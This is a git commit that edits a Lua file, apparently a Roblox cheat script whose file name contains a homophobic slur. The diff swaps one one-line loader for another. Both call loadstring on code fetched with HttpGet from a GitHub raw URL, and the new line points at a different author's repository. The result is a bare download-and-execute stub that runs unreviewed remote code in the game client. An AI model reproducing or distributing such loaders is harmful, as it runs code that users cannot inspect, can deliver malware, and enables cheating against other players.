049f7a848fad0d74cdb647bc80b5fd882b09efe5
osintshitscripts <osintshit@gmail.com>
2025-11-24 18:43:07 -0500

    Update homohack.lua

--- homohack.lua
+++ homohack.lua
@@ -1,1 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/dementiaenjoyer/homohack/main/loader.lua"))()
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/osintshitscripts/load/main/loader.lua"))()
